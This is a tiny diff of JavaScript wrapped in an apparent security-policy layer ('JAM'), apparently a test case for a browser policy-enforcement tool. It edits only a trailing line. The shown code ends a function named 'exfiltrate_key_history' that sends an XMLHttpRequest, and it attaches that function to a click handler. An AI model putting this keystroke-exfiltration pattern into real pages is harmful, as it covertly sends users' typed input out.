@@ -17,5 +17,4 @@ function exfiltrate_key_history() {
   JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.p13);
   return
 }
-JAM.set(JAM.call(document.getElementById, document, ["test"], JAM.policy.p14), "onclick", exfiltrate_key_history);
-
+JAM.set(JAM.call(document.getElementById, document, ["test"], JAM.policy.p14), "onclick", exfiltrate_key_history)
